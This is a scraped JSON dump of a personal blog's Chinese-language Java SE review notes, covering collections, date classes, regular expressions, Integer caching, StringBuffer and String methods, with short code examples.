无序，无索引，不可重复储存（我们只要学习如何保证元素不是重复的） / | \\ / \\ / | \\ / \\ / | \\ / \\ ArrayList LinkedList Vector HashSet TreeSet 查改快(直接索引查找) 查改慢(要遍历) 查改略慢 增删慢(考虑增容、拷贝) 增删快 增删慢 线程不安全 线程安全 线程安全 数组实现 链表实现 数组实现 Collection集合的方法 .add() 向集合中存入数据，list集合返回true，Set集合如果集合有相同的数据返回false，否则true。 .remove() 删除 .toArray() 把集合转换成数组输出，如果ArrayList对象加了泛型，那么可以传入某类型数组对象，然后用某类型数组直接引用。 .addAll() 把传入集合加入到调用的集合中 .removeAll() 删除调用集合中与传入集合交集的数据 .containsAll() 判断调用集合中是否有传入集合的数据 .retainAll() 取两个集合的交集，如果传入类有交集那么会把那两个值覆盖调用集合的值，调用的集合改变了就返回true，否则false List集合方法： .add(int index,) 在某个索引添加指定数据 .remove(int index,) 在某个索引删除指定数据，删除了什么就返回什么。一个小问题：remove不会自动装箱，可能会识别错误导致程序出错 .get(int index,) 输出索引对应的数据，所以list可以直接用这个方法遍历数组，不用迭代了。 .set(int index,) 设置指定索引的数据 ps：集合containsAll、removeAll等方法底层都是基于equals方法的，所以在集合中处理对象时，传入对象需要重写object父类的equals方法才能实现效果。 集合迭代的概述： 集合是存储元素，而这些元素需要查看，那么就需要用到迭代，迭代也就是遍历。 迭代使用示例：123456789Collection c = new ArrayList();Iterator it = c.iterator();//.hasNext()判断是否还有数据While(it.hasNext())&#123; System.out.println(it.next()); //.next()获取下一个数据&#125; 迭代器修改数据产生的异常与解决方案： 异常： 在利用迭代器遍历数据时，如果我们在遍历的中途给集合添加数据，那么会出现异常 异常原因： 在创建iterator迭代器时已经把集合的数量给了迭代器，如果中途给集合添加数据就是并发修改了。 解决方法： 使用iterator这个list独有的迭代器，然后调用Itterator自己的add添加数据。 Vector的概述 jdk刚出来他就有了，在jdk1.2版本加入了collection体系，后来因为vector有的功能ArrayList都有，而且还比他强大，所以不用vector了。 Vector与ArrayList的区别 Vector是线程安全的，它的效率相对低也就是查询相对慢； 反之ArrayList它是线程不安全的，但是效率高。 LinkedList集合的概述 使用链表实现的list集合。 数组实现集合与链表实现集合的优缺点： 数组： 查询修改快，但是增删慢 链表： 查询修改慢，但是增删快 集合的面试题——之ArrayList、Vector、linkedList区别： ArrayList： 数组实现，查询修改快，但是增删慢，它是线程不安全的。 LinkedList： 链表实现，查询修改慢，但是增删快，它是线程不安全的。 Vector： 数组实现，相对ArrayList查询慢效率低，因为它是线程安全的。 他们三个的用法： 1、查询多用ArrayList2、增删多用LinkedList3、增删查询都多用ArrayList4、Vector面试的时候用，虽然它是线程安全的，但是在需要线程安全的时候也不用它。 LinkedList的特殊方法 .addFirst() 与 .addLast() 在链表头部与尾部添加数据 .getFirst 与 .getLast() 获取链表头部或者尾部数据 .removeFirst 与 .removeLast() 删除链表头部或者尾部数据 .get() 获取链表指定位置的数据","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Collection集合","slug":"Collection集合","permalink":"http://liuhaoan.github.io/tags/Collection集合/"},{"name":"集合","slug":"集合","permalink":"http://liuhaoan.github.io/tags/集合/"}]},{"title":"javaSE复习之——Date、SimpDateFormat、Calendar类","slug":"javaSE复习之——Date、SimpDateFormat、Calendar类","date":"2019-04-09T12:41:36.000Z","updated":"2019-04-09T12:52:42.961Z","comments":true,"path":"2019/04/09/javaSE复习之——Date、SimpDateFormat、Calendar类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Date、SimpDateFormat、Calendar类/","excerpt":"Date的概述 获取瞬间时间，精确到毫秒。 例子： 12345Date d = new Date();//打印d会显示打印时瞬间的电脑系统时间Date d = new Date(0)//这样会打印1970年1月1日的8点","text":"Date的概述 获取瞬间时间，精确到毫秒。 例子： 12345Date d = new Date();//打印d会显示打印时瞬间的电脑系统时间Date d = new Date(0)//这样会打印1970年1月1日的8点 解析： 1、为什么是1970年1月1日：首先1970年1月1日是c语言和UNLX的生日，然后因为最早的计算机是32位的，32位最多表示的时间是68年，而最早出现的UNLX系统考虑到计算机产生的年代和应用的时限，所以综合取了1970年1月1日为UNLX 的纪元时间开始。 2、为什么是8点：因为我们电脑的时区是东8区，所以显示的是8点。 Date的方法 .getTime() 通过时间对象获取毫秒值 .setTime() 设置毫秒值，设置1000那么输出时间对象的时间为：1970年1月1日8点钟多一秒。 SimpDateFormat的概述 1、它是DateFormat的子类，拥有DateFormat的所有功能。 2、DateFormat 是日期/时间格式化子类的抽象类 3、SimpleDateFormat 是一个以与语言环境有关的方式来格式化和解析日期的具体类。它允许进行格式化（日期 -&gt; 文本）、解析（文本 -&gt; 日期）和规范化。总的来说，它们就是一个日期格式化类，构造方法传入格式规则可以按照相应的规则格式化日期。 方法 .format(Date d) 把日期类转换为String类 .parse(String str) 把时间字符串转换成日期对象，需要配合异常使用。 SimpleDateFormat类的实例12345678Date d = new Date(0);//获取当前瞬间时间SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH:mm:ss\");//创建日期格式化类并且进行格式化System.out.println(sdf.format(d));//格式化并且输出时间，结果为：1970年 Calendar类的概述 它把K的很多方法都替代掉了，Calendar 类是一个抽象类，它为特定瞬间与一组诸如 YEAR、MONTH、DAY_OF_MONTH、HOUR 等 日历字段之间的转换提供了一些方法，并为操作日历字段（例如获得下星期的日期）提供了一些方法。 方法： .getInstance() 获得一个日历，并且是基于当前时间的，返回一个Calendar的子类，可以父类引用子类对象 .get(int field) 返回指定日历字段的值，日历字段代表年月日那些，比如1那么就表示年，不过为了方便，Calendar给出了字段常量，比如Calendar.YEAR常量它的值是1，代表了年。 .add(int field,int i1) 指定字段的值加减，当前年为2018 例当前年为2018：add(Calendar.YEAR，-1)那么返回2017 .set(int year,int month,int day) 修改指定字段,可以直接修改年月日，也可以像add那样修改年等。 代码示例：123456//获取今天年月日和星期Calendar c = Calendar.getInstance();//获取一个日历System.out.println(c.get(Calendar.YEAR) + \"年\" + c.get(Calendar.MONTH) + 1 + \"月\" + c.get(Calendar.DAY_OF_MONTH) + \"日\\n星期\" + (c.get(Calendar.DAY_OF_WEEK) - 1));","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Date类","slug":"Date类","permalink":"http://liuhaoan.github.io/tags/Date类/"},{"name":"SimpDateFormat类","slug":"SimpDateFormat类","permalink":"http://liuhaoan.github.io/tags/SimpDateFormat类/"},{"name":"Calendar类","slug":"Calendar类","permalink":"http://liuhaoan.github.io/tags/Calendar类/"}]},{"title":"javaSE复习之——BigInteger与BigDecimal类","slug":"javaSE复习之——BigInteger与BigDecimal类","date":"2019-04-09T12:34:20.000Z","updated":"2019-04-09T12:40:18.041Z","comments":true,"path":"2019/04/09/javaSE复习之——BigInteger与BigDecimal类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——BigInteger与BigDecimal类/","excerpt":"BigInteger的概述 不可变的任意精度的整数。所有操作中，都以二进制补码形式表示 BigInteger（如 Java 的基本整数类型）。 BigInteger 提供所有 Java 的基本整数操作符的对应物，并提供 java.lang.Math 的所有相关方法。 另外，BigInteger 还提供以下运算：模算术、GCD 计算、质数测试、素数生成、位操作以及一些其他操作。","text":"BigInteger的概述 不可变的任意精度的整数。所有操作中，都以二进制补码形式表示 BigInteger（如 Java 的基本整数类型）。 BigInteger 提供所有 Java 的基本整数操作符的对应物，并提供 java.lang.Math 的所有相关方法。 另外，BigInteger 还提供以下运算：模算术、GCD 计算、质数测试、素数生成、位操作以及一些其他操作。 ps：了解一下BigInteger类可以存下任意长度的数值就行了。 与BigInteger不同的是，BigDecimal是小数####注意事项： 开发中创建BigDecimal对象进行运算时，给它有参构造传入的值要以字符串形式传入，如果以数值形式传入的话会损失精度。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"BigInteger类","slug":"BigInteger类","permalink":"http://liuhaoan.github.io/tags/BigInteger类/"},{"name":"BigDecimal类","slug":"BigDecimal类","permalink":"http://liuhaoan.github.io/tags/BigDecimal类/"}]},{"title":"javaSE复习之——System类","slug":"javaSE复习之——System类","date":"2019-04-09T12:23:18.000Z","updated":"2019-04-09T12:31:36.029Z","comments":true,"path":"2019/04/09/javaSE复习之——System类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——System类/","excerpt":"System类的概述 System类有标准输入、标准输出和错误输出流； 对外部定义的属性和环境变量的访问；加载文件和库的方法； 还有快速复制数组的一部分的实用方法。","text":"System类的概述 System类有标准输入、标准输出和错误输出流； 对外部定义的属性和环境变量的访问；加载文件和库的方法； 还有快速复制数组的一部分的实用方法。 字段： err标准错误流 in标准输入流 out标准输出流 System类的方法 .gc() 运行垃圾收集器，虽然objcket类中有一个filalize的方法会自动清理垃圾，但是垃圾没有超过一个量是不会自动收集的。 .exit() 退出java虚拟机jvm，传入值为0是正常终止，非0为异常终止。 .currentTimeMillis() 返回当前时间与协调世界时 1970 年 1 月 1 日午夜之间的时间差（以毫秒为单位测量）。 ps：经常应用在计算程序运行时间，从程序开始记录一次，结束记录一次，然后减去即可。 .arraycopy(Object src, int srcPos, Object dest, int destPos, int length) 从指定源数组中复制一个数组，复制从指定的位置开始，到目标数组的指定位置结束。 参数：src - 源数组。srcPos - 源数组中的起始位置。dest - 目标数组。destPos - 目标数据中的起始位置。length - 要复制的数组元素的数量。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"System类","slug":"System类","permalink":"http://liuhaoan.github.io/tags/System类/"}]},{"title":"javaSE复习之——Random类","slug":"javaSE复习之——Random类","date":"2019-04-09T12:21:11.000Z","updated":"2019-04-09T12:22:36.527Z","comments":true,"path":"2019/04/09/javaSE复习之——Random类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Random类/","excerpt":"","text":"Random概述 利用传入的随机数种子，生成一个伪随机数 Random类的方法 .nextInt(Int i); 生成一个从0到i的随机数，包括0不包括i 例子1234567Random r = new Random();//不输入种子的话系统自动使用纳秒来当作种子r.nextInt(100);//生成了0到100的随机数，不包括100//ps：如果要生成1-100的随机数，直接+1","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Random类","slug":"Random类","permalink":"http://liuhaoan.github.io/tags/Random类/"}]},{"title":"javaSE复习之——Math数学类的使用","slug":"javaSE复习之——Math数学类的使用","date":"2019-04-09T12:17:11.000Z","updated":"2019-04-09T12:20:16.752Z","comments":true,"path":"2019/04/09/javaSE复习之——Math数学类的使用/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Math数学类的使用/","excerpt":"Math类的方法 int abs(int a) 取绝对值 double ceil(double a) 向上取整数返回double，例子：输入12.56输出一个13.0 double floor(double a) 与上同理，但是向下取整数","text":"Math类的方法 int abs(int a) 取绝对值 double ceil(double a) 向上取整数返回double，例子：输入12.56输出一个13.0 double floor(double a) 与上同理，但是向下取整数 int max(int a,int b) min自学 取大的值 double pow(double a,double b) a是底数，b是指数 double random() 生成0.0到1.0之间的随机小数，包括0.0不包括1.0 int round(float a) 参数为double的自学 四舍五入 double sqrt(double a) 开平方 输入4返回2.0 输入9返回3","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Math类","slug":"Math类","permalink":"http://liuhaoan.github.io/tags/Math类/"}]},{"title":"javaSE复习之——正则表达式","slug":"javaSE复习之——正则表达式","date":"2019-04-09T11:58:39.000Z","updated":"2019-04-09T12:16:00.153Z","comments":true,"path":"2019/04/09/javaSE复习之——正则表达式/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——正则表达式/","excerpt":"正则表达式概念 就是一种规则，可以在某一段字符串中以某一个特殊的规则，取到自己想要的那段字符串。","text":"正则表达式概念 就是一种规则，可以在某一段字符串中以某一个特殊的规则，取到自己想要的那段字符串。 String中的正则表达式方法： .matches() 是否匹配这个正则表达式，返回true或者false .replaceAll(String regex,String xxx) 替换所有匹配到的字符串 ps：使用正则非常好用，例：regex的内容为\\d 那么那个字符串的所有数字都会被替换 .replaceFirst(String regex,String xxx) 替换找到的第一个字符串 .split() 以某一个字符串切割字符串 正则表达式专属类与方法实现方法：12345678Pattern p = Pattern.compile(\"a*b\");//把正则表达式编译到模式中Matcher m = p.matcher(\"aaaaab\");//使用上面创建的对象来匹配一个字符串boolean b = m.matches();//全部匹配到了则返回true 实战例子：12345678910111213String str1 = \"我手机号码是18734126341，曾经用过17707053381，曾经还用过13228865165\";Pattern p = Pattern.compile(\"1[356789]\\\\d&#123;9&#125;\");//把正则表达式编译到模式中Matcher m = p.matcher(str1);//创建一个匹配器while(m.find())//匹配下一个能成功匹配的字符串，成功返回trueSystem.out.println(m.group());//返回上一个匹配到的字符串 正则表达式字符类 表达式 获取结果 [abc] a、b 或 c（简单类） [^abc] 任何字符，除了 a、b 或 c（否定） [a-zA-Z] a 到 z 或 A 到 Z，两头的字母包括在内（范围） [a-d[m-p]] a 到 d 或 m 到 p：[a-dm-p]（并集） [a-z&amp;&amp;[def]] d、e 或 f（交集） [a-z&amp;&amp;[^bc]] a 到 z，除了 b 和 c：[ad-z]（减去） [a-z&amp;&amp;[^m-p]] a 到 z，而非 m 到 p：[a-lq-z]（减去） 正则表达式预定义字符类 表达式 获取结果 . 任何字符（与行结束符可能匹配也可能不匹配） \\d 数字：[0-9] \\D 非数字： [^0-9] \\s 空白字符：[ \\t\\n\\x0B\\f\\r] \\S 非空白字符：[^\\s] \\w 单词字符：[a-zA-Z_0-9] \\W 非单词字符：[^\\w] 正则表达式Greedy 数量词 表达式 获取结果 X? X，一次或一次也没有 X* X，零次或多次 X+ X，一次或多次 X{n} X，恰好 n 次 X{n,} X，至少 n 次 X{n,m} X，至少 n 次，但是不超过 m 次 正则表达式的分组功能 1、使用（）进行分组 例子：(.)\\1(.)\\2 代表：第一组再出现一次，第二组也再出现一次，也就是\\1同等与上一组出现的数据 例子：123str1 = “高高兴兴”str1.matches(\"(.)\\\\1(.)\\\\2\")//返回true 2、$符号，在替换时可以获取到正则表达式中某组获取到的字符，$1代表获取到第一组中的字符串 例子：12\"问问啊啊\".replaceAll(\"(.)\\\\1\",\"$1\");//替换后的结果为：问啊 $1 获取到了(.)的值","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"http://liuhaoan.github.io/tags/正则表达式/"}]},{"title":"javaSE复习之——Integer中的常见面试题","slug":"javaSE复习之——Integer中的常见面试题","date":"2019-04-09T09:16:38.000Z","updated":"2019-04-09T09:22:44.443Z","comments":true,"path":"2019/04/09/javaSE复习之——Integer中的常见面试题/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Integer中的常见面试题/","excerpt":"代码示例","text":"代码示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.heima.wrapclass;public class Demo5_Integer &#123; /** * @param args */ public static void main(String[] args) &#123; Integer i1 = new Integer(97); Integer i2 = new Integer(97); System.out.println(i1 == i2); //false System.out.println(i1.equals(i2)); //true System.out.println(\"-----------\"); Integer i3 = new Integer(197); Integer i4 = new Integer(197); System.out.println(i3 == i4); //false System.out.println(i3.equals(i4)); //true System.out.println(\"-----------\"); Integer i5 = 127; Integer i6 = 127; System.out.println(i5 == i6); //true System.out.println(i5.equals(i6)); //true System.out.println(\"-----------\"); Integer i7 = 128; Integer i8 = 128; System.out.println(i7 == i8); System.out.println(i7.equals(i8)); //true /* * -128到127是byte的取值范围,如果在这个取值范围内,自动装箱就不会新创建对象,而是从常量池中获取 * 如果超过了byte取值范围就会再新创建对象 * * public static Integer valueOf(int i) &#123; assert IntegerCache.high &gt;= 127; //i&gt;= -128 &amp;&amp; i &lt;= 127 if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); &#125; */ &#125;&#125; 总结 底层代码可以理解成一个数组，这个数组索引0对应着-128、255对应着127，当传入的值在-128 - 127之间时自动装箱时会直接在这个数组中取值，进而引用地址是一样的，所以上面返回了true","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面试题","slug":"面试题","permalink":"http://liuhaoan.github.io/tags/面试题/"},{"name":"Integer","slug":"Integer","permalink":"http://liuhaoan.github.io/tags/Integer/"},{"name":"Integer面试题","slug":"Integer面试题","permalink":"http://liuhaoan.github.io/tags/Integer面试题/"}]},{"title":"javaSE复习之——JDK5新特性之_自动拆箱与装箱","slug":"javaSE复习之——JDK5新特性之-自动拆箱与装箱","date":"2019-04-09T09:13:54.000Z","updated":"2019-04-09T09:15:22.581Z","comments":true,"path":"2019/04/09/javaSE复习之——JDK5新特性之-自动拆箱与装箱/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——JDK5新特性之-自动拆箱与装箱/","excerpt":"","text":"代码详解123456789101112int x = 123;Integer i1 = new Integer(x);//手动装箱int y = i1.intValue();//手动拆箱Ineger x = 123;//自动装箱，他的底层是手动装箱int a = x + 100;//自动拆箱，他的底层是自动拆箱","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"新特性","slug":"新特性","permalink":"http://liuhaoan.github.io/tags/新特性/"},{"name":"JDK5","slug":"JDK5","permalink":"http://liuhaoan.github.io/tags/JDK5/"},{"name":"自动拆箱","slug":"自动拆箱","permalink":"http://liuhaoan.github.io/tags/自动拆箱/"},{"name":"自动装箱","slug":"自动装箱","permalink":"http://liuhaoan.github.io/tags/自动装箱/"}]},{"title":"javaSE复习之——String转换为其他数据类型","slug":"javaSE复习之——String转换为其他数据类型","date":"2019-04-09T09:10:35.000Z","updated":"2019-04-09T09:12:42.799Z","comments":true,"path":"2019/04/09/javaSE复习之——String转换为其他数据类型/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——String转换为其他数据类型/","excerpt":"","text":"代码： .parseXXX(“”); 特点： 基本数据类型包装类有八种，其中除了char其他都有.parseXXX()方法，因为char只能存入一个字符。 代码示例： 12String s1 = \"123\";int i = Integer.parseInt(s1);","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"String","slug":"String","permalink":"http://liuhaoan.github.io/tags/String/"},{"name":"String转换为其他数据类型","slug":"String转换为其他数据类型","permalink":"http://liuhaoan.github.io/tags/String转换为其他数据类型/"}]},{"title":"javaSE复习之——String与int的相互转换","slug":"javaSE复习之——String与int的相互转换","date":"2019-04-09T09:04:41.000Z","updated":"2019-04-09T09:09:53.670Z","comments":true,"path":"2019/04/09/javaSE复习之——String与int的相互转换/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——String与int的相互转换/","excerpt":"String转int 1、String s1 = 1 + “”； 2、String s2 = string.toString(1); 3、Integer i = new Integer(1); String s1 = i.toString(); 4、String s1 = Integer.toString(1); ps:推荐用第一第二种方式，代码更简洁。","text":"String转int 1、String s1 = 1 + “”； 2、String s2 = string.toString(1); 3、Integer i = new Integer(1); String s1 = i.toString(); 4、String s1 = Integer.toString(1); ps:推荐用第一第二种方式，代码更简洁。 int转String 1、123String s1 = \"123\";Integer i = new Integer(s1);int a = i.intValue(); 2、1String s1 = Integer.parseInt(123); ps:推荐用第二种","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"String与int的相互转换","slug":"String与int的相互转换","permalink":"http://liuhaoan.github.io/tags/String与int的相互转换/"},{"name":"String转int","slug":"String转int","permalink":"http://liuhaoan.github.io/tags/String转int/"},{"name":"int转String","slug":"int转String","permalink":"http://liuhaoan.github.io/tags/int转String/"}]},{"title":"javaSE复习之——基本数据类型包装类","slug":"javaSE复习之——基本数据类型包装类","date":"2019-04-09T08:58:32.000Z","updated":"2019-04-09T09:03:44.552Z","comments":true,"path":"2019/04/09/javaSE复习之——基本数据类型包装类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——基本数据类型包装类/","excerpt":"基本数据类型和包装类的对应表 基本数据类型 包装类 byte Byte short Short long Long float Float double Double boolean Boolean —————–上面的只是改大写，下面的改的更多","text":"基本数据类型和包装类的对应表 基本数据类型 包装类 byte Byte short Short long Long float Float double Double boolean Boolean —————–上面的只是改大写，下面的改的更多 基本数据类型 包装类 int Integer char Character Integer的特点： 1、能在int和String类型之间相互转换 2、提供了处理int类型时，非常有用的其他一些常量和方法。 3、能在创建对象时传入String类型的数据，但只限于int值。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"基本数据类型包装类","slug":"基本数据类型包装类","permalink":"http://liuhaoan.github.io/tags/基本数据类型包装类/"}]},{"title":"javaSE复习之——Arrays类","slug":"javaSE复习之——Arrays类","date":"2019-04-09T08:51:02.000Z","updated":"2019-04-09T08:57:34.400Z","comments":true,"path":"2019/04/09/javaSE复习之——Arrays类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Arrays类/","excerpt":"Arrays类的概述 它其实就是一个数组的工具类，提供各种关于数组的操作","text":"Arrays类的概述 它其实就是一个数组的工具类，提供各种关于数组的操作 Arrats的方法： .toString() 数组转换为字符串 .sort() 数组排序 .binarySearch() 二分查找，返回索引值，如果没找到就返回，被查找数据在数组中应该出现的插入点的负数 减去1 前提：这个数组是一个序列数组 .asList() 把数组转换成集合，用List引用。例子： 1List&lt;String&gt; l = Arrays.asList(数组); 数组转集合的意义： 虽然从数组转换成的集合不能增加和减少，但是我们可以用集合的思想来操作数组，也就是用集合除add、remove以外的方法。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Arrays类","slug":"Arrays类","permalink":"http://liuhaoan.github.io/tags/Arrays类/"}]},{"title":"javaSE复习之——StringBuffer类","slug":"javaSE复习之——StringBuffer类","date":"2019-04-09T08:31:59.000Z","updated":"2019-04-09T08:49:48.694Z","comments":true,"path":"2019/04/09/javaSE复习之——StringBuffer类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——StringBuffer类/","excerpt":"StringBuffer的概述 1、它是字符串缓冲区（容器），底层默认是长度为16的字符数组。 2、StringBuffer是线程安全的，StringBuilder是线程不安全的 3、线程安全速度更慢，线程不安全速度更快。","text":"StringBuffer的概述 1、它是字符串缓冲区（容器），底层默认是长度为16的字符数组。 2、StringBuffer是线程安全的，StringBuilder是线程不安全的 3、线程安全速度更慢，线程不安全速度更快。 StringBuffer与String的区别 1、String赋的值它是不能被改变的，只能丢弃重新创建，如果字符拼接过多会产生过多的垃圾。 2、StringBuffer赋的值是可以被改变的，类似字符拼接建议用这个类，因为不会产生过多的垃圾。 2、虽然它们都是引用数据类型，但是String做参数传递时是和基本数据类型一样的，而StringBuffer传递的只是对创建对象的引用，也就是地址值。 StringBuffer的方法 属性获取： .capacity()返回当前容量 .length()返回实际长度 数据添加： .append()把任何数据传入字符串缓冲区，然后返回缓冲区对象本身。 .insert(索引,字符串)在任意位置之后将任意类型数据插入字符串缓冲取内，返回本身。 数据删除： .deleteCharAt()删除任意索引的数据，返回本身。 .delete(索引1,索引2)删除从索引1开始到索引2位置的数据，返回本身。（包含头不包含尾） 数据替换反转： .reverse()字符反转 .replace(开始索引，结束索引，要替换的数据)&gt;字符替换 数据截取：（截取后返回的数据不是表示容器本身，而是返回一个String） .subString(索引)从索引开始，截取到字符串末尾。 .subString(开始,结尾)从开始位置截取字符串到结尾位置，不包括结尾索引。 StringBuffer的构造方法特点 1、无参构造默认容量为 16个字符 2、传入整数，比如传入10，那么这个容器的容量就为10个字符 3、传入一个字符串，比如传入：啊啊，那么实际长度为4，字符串缓冲区容量为20 4、如果内部缓冲区溢出，那么容量自动增大。 5、StringBuffer重写了toString()方法，显示的是它的属性值，也就是它的元素。 StringBuffer注意事项 1、不要利用重新创建另一个对象来试图清空容器，这只是引用了另一个容器对象而已，之前的那个容器并没有被清空，可以利用delete方法清空容器。 2、因为String与任意字符串相加的底层实现就是使用容器，并且String的值是不能修改的，它只能把之前的数据做垃圾处理重新创建一个数据，这样会不断的产生垃圾，所以在类似 字符串数组 转换成 字符串 或者 字符串拼接（String s = s1 + s2；） 的例程中使用容器最好。 StringBuffer与String的互转： StringBuffer转String 1、创建一个String对象，把容器传进去。 2、使用toString()方法。 3、使用subString()方法。 String转StringBuffer 1、创建一个StringBuffer对象，传入字符串即可。 2、通过append()方法把字符串加入到容器内。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"StringBuffer类","slug":"StringBuffer类","permalink":"http://liuhaoan.github.io/tags/StringBuffer类/"}]},{"title":"javaSE复习之——String类","slug":"javaSE复习之——String类","date":"2019-04-09T07:42:02.000Z","updated":"2019-04-09T08:31:15.266Z","comments":true,"path":"2019/04/09/javaSE复习之——String类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——String类/","excerpt":"String类的概述 它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个基本数据类型，但其实它是一个引用数据类型.","text":"String类的概述 它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个基本数据类型，但其实它是一个引用数据类型. String类特点： 1、String实际上是一个类，它重写了toString方法，所以创建String引用后直接输出调用该引用的名称就可以输出字符串数据。 2、String属于引用数据类型，而不是基本数据类型，基本数据类型为：int、char。。。，所以String数据对比需要用到equals方法，否则会出现判断不准确的问题 3、String没有set和get方法，所以它不存在修改数据，只能是替换数据，把之前的数据当作垃圾。 4、String s = “abc” 与 String a = “abc” 它们两个变量其实是记录了常量池中的地址值，而常量池有个特性，就是已有的数据它不会再去创建，所以 s==a为ture 5、String s = &quot;a&quot; + &quot;b&quot; + &quot;c&quot; 同等于String a = &quot;abc&quot; 因为java有常量优化机制，java编译时已经确定s = abc，所以s拿到的是常量abc的地址。 6、 1234String b = \"ab\"String c = \"abc\"c == a + \"c\"//结果为false 解析：因为任何数据与字符串用 + 连接，会在堆内存中创建StringBuider 或 StringBuffer缓冲区对象并使用append方法把数据相连，这里会得出：&quot;abc&quot;然后再使用toString方法创建一个“abc”的String对象返回这个”abc”被保存在堆内存中，而不是保存在常量池，所以变量c的值是常量池中的地址，而a + “c”是堆内存中的地址，所以用“==”号做比较返回false 7、String赋的值是不可以被改变的，只有把之前的值丢弃变成垃圾后，再赋新的值。 8、String虽然是引用数据类型，但是它当作参数传递的时候，它是和基本数据类型一样的。 获取键盘输入String需要注意的 System.in 它是标准的输入流，对应着键盘录入 sc.hasNextxxx（） 它判断输入的数是不是xxx数据类型，xxx可以是int、double等 sc.nextxxx（） 它获取已经输入的项，xxx和上面的xxx相同 sc.nextLine() 它获取字符串，遇到/r/n就结束，也是因为这个机制，所以和其他获取输入命令混用会出现获取不到的问题，举个例子。 例：nextInt() 之后又用 nexiLine() 获取的是整数，而实际是全部内容为 数值/r/n 此命令只获取数值部分，所以留下了/r/n，然后nextLine见到上面这个/r/n就直接结束了。 解决方法：录入所有数据都用nextLine，然后通过数据转换来实现。 String的构造方法12String str = new String(Byte[] b);//有参构造 可以按照平台的默认字符集（也就是码表，GBK等等）解码byte数组，而gbk等码表都涵盖了ascii码表，而码表中98、99等代码都代表着ab等，所以解码后看到的和解码前的数据不一样。 12String str = new String(Byte[] b,2,4);//表示从b数组中的第二个索引开始解码，总共解码4个数据 String类的判断功能 .equals() 比较字符串内容序列是否相同，区分大小写 .equalsIgnoreCase() 与上面不同的是：不区分大小写 .contains() 判断字符串中是否包含传入的字符串 .startsWith() 判断字符串是否以传入字符串开头 .endswith() 判断字符串是否以传入字符串结尾 .isEmpty() 判断字符串是否为空 Null与””的区别 “”是字符串常量，也是String类的对象，所以可以调用String类的方法 Null是空常量，不能调用任何方法，否则会出现空指针异常，Null可以给任意引用数据类型赋值。 注意事项： 1、以后比较字符串时最好都用equals，因为equals比较的是内容，而==号比较的时后，有时比较的是地址值 2、使用equals时，有常量就用常量对象的equals方法，尽量不用变量对象的equals方法，因为变量对象的值有可能时null，调用equals方法会出现空指针异常 String类的获取功能 .length() 获取字符串长度(字符个数) 例子：&quot;我&quot;.length() 为1 ps：数组中的length是属性，而String中的是对象方法 .charAt() 获取指定索引的字符 .indexOf() 返回字符 或 字符串在此字符串中第一次出现的索引 如果不存在返回-1 如果查找的是字符串，返回索引就是查找字符串第一个字符的索引 .indexOf(,) 与上面不同的是在某个位置之后查找 .lastIndexOf() 从后向前找 .substring() 从指定位置开始截取字符串，默认到末尾 .substring(,) 与上不同的是自己指定了截取字符串的尾部位置并且，包含头不包含尾部 注意：截取字符串之后需要用一个变量来保存，因为substring是不会改变原来的值的。 GBK码表的特性 1、中文是两个字节组成 2、中文字节的第一个字节一定是负数 String类的类型转换功能 .getBytes() 